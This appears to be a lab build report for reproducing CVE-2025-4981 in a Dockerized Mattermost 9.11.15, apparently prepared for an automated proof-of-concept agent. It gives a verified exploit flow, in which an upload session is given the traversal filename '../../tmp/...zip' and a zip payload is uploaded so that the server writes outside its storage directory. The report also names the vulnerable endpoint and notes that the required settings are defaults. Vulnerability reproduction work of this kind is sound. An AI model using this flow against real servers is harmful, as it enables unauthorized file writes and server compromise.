# Lab Build Report: CVE-2025-4981

## Lab Architecture

**Multi-container** setup using Docker Compose:

| Container | Image | Role | Network(s) |
|-----------|-------|------|------------|
| `cve-2025-4981-db` | `postgres:15-bookworm` | PostgreSQL database backend | `lab-net` |
| `cve-2025-4981-mattermost` | `mattermost/mattermost-team-edition:9.11.15` | Vulnerable Mattermost Server v9.11.15 | `lab-net` |

**Architecture rationale**: Mattermost connects to PostgreSQL via configurable `host:port` (environment variable `MM_SQLSETTINGS_DATASOURCE`), making multi-container the correct approach.

## Container Details

### PostgreSQL (`cve-2025-4981-db`)
- **Image**: `postgres:15-bookworm`
- **Purpose**: Database backend for Mattermost
- **Credentials**: `mmuser` / `mmuser_password`
- **Database**: `mattermost`
- **Health check**: `pg_isready -U mmuser -d mattermost`
- **Network**: `lab-net` only (internal)

### Mattermost (`cve-2025-4981-mattermost`)
- **Image**: `mattermost/mattermost-team-edition:9.11.15` (vulnerable version)
- **Version**: 9.11.15 (Build 14925889255, hash f62412feab8acb0b9e231dbc1cc6909cee79ceff)
- **Port**: 8065 (HTTP API)
- **Health check**: `curl -f http://localhost:8065/api/v4/system/ping`
- **Networks**: `lab-net` (for DB connectivity)
- **Key config**:
  - `MM_FILESETTINGS_ENABLEFILEATTACHMENTS=true` — required for file uploads
  - `MM_SERVICESETTINGS_ENABLELOCALMODE=true` — enables `mmctl --local` for user setup
  - `MM_SERVICESETTINGS_ENABLETESTING=true` — enables testing endpoints
  - Content extraction enabled by default (no override needed)

## Pre-configured Test Credentials

| Field | Value |
|-------|-------|
| **Username** | `admin` |
| **Password** | `Admin123!@#` |
| **Email** | `admin@test.local` |
| **Role** | System Admin |
| **Team** | `testteam` |
| **Channel** | `exploits` (team: `testteam`) |

## Build Status

| Container | Status | Notes |
|-----------|--------|-------|
| `cve-2025-4981-db` | ✅ Healthy | PostgreSQL 15, started and accepting connections |
| `cve-2025-4981-mattermost` | ✅ Healthy | Mattermost 9.11.15, API responding, user/team/channel created |

**Platform note**: The Mattermost image is `linux/amd64` running on `linux/arm64` host via QEMU emulation. This works correctly but may be slower than native execution.

## Start/Stop Commands

```bash
# Start lab
docker compose up -d

# Wait for healthy state, then initialize user/team/channel
bash init-mattermost.sh

# Stop lab
docker compose down

# Full reset (including database volume)
docker compose down -v
```

## Accessing Mattermost

```bash
# Test connectivity
curl -s http://localhost:8065/api/v4/system/ping
```

## Verification Evidence

### 1. API Connectivity
```
GET /api/v4/system/ping → {"status":"OK"}
```

### 2. Authentication
```
POST /api/v4/users/login with {"login_id":"admin","password":"Admin123!@#"}
→ HTTP 200, Token: wgxe1zhhfib5ix8ssqiexh7mpw
```

### 3. Vulnerability Confirmation (Path Traversal File Write)
The vulnerability was verified end-to-end:

1. Created upload session with traversal filename:
   ```
   POST /api/v4/uploads
   {"channel_id":"<id>","filename":"../../tmp/cve-2025-4981-proof.zip","file_size":146}
   → 200 OK, upload_id returned, filename stored as-is
   ```

2. Uploaded a valid zip payload:
   ```
   POST /api/v4/uploads/<upload_id>
   Content-Type: application/octet-stream
   <zip_bytes>
   → 200 OK, file info returned with name "../../tmp/cve-2025-4981-proof.zip"
   ```

3. Verified file write to traversed path:
   ```
   docker exec cve-2025-4981-mattermost ls -la /tmp/cve-2025-4981-proof.zip
   → -rw-r--r-- 1 mattermost mattermost 146 Mar  1 01:56 /tmp/cve-2025-4981-proof.zip
   
   MD5 match: 5614fa56a72c644433c025ef36318c22 (uploaded) == 5614fa56a72c644433c025ef36318c22 (written)
   ```

The proof file was cleaned up after verification.

## Attack Surface for PoC Agent

### Vulnerable API Endpoint
- **Upload Session API** (`POST /api/v4/uploads` + `POST /api/v4/uploads/{id}`) — the upload session stores the filename verbatim, and content extraction writes to the path-traversed location
- **NOT exploitable via** direct multipart upload (`POST /api/v4/files`) — that path applies `filepath.Base()` sanitization

### PoC Flow
1. Authenticate: `POST /api/v4/users/login` → get `Token` header
2. Get channel ID: `GET /api/v4/users/me/channels`
3. Create upload session: `POST /api/v4/uploads` with `filename: "../../tmp/cve-2025-4981-proof.zip"`
4. Upload data: `POST /api/v4/uploads/{id}` with zip payload
5. Wait ~3s for async content extraction
6. Verify: `docker exec cve-2025-4981-mattermost ls -la /tmp/cve-2025-4981-proof.zip`

### Key Configuration (all defaults — no changes needed)
- `FileSettings.EnableFileAttachments` = `true` (default)
- `FileSettings.ExtractContent` = `true` (default)
- Filename must end with archive extension (`.zip` recommended)

## Known Issues / Workarounds

1. **Platform emulation**: The Mattermost Docker image is `linux/amd64` only. On ARM64 hosts, it runs via QEMU emulation (slower but functional).
2. **CLI changed**: Mattermost 9.x uses `mmctl --local` instead of `mattermost user/team/channel` for management commands. The init script uses the correct `mmctl` syntax.
3. **curl escaping**: When using `curl` with `--data-raw` from the worker container shell, JSON payloads may be silently truncated. Use `-d @file` with a JSON file instead for reliable API calls.

## Lab Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Docker Compose orchestration (PostgreSQL + Mattermost) |
| `init-mattermost.sh` | Post-start initialization (creates user, team, channel) |
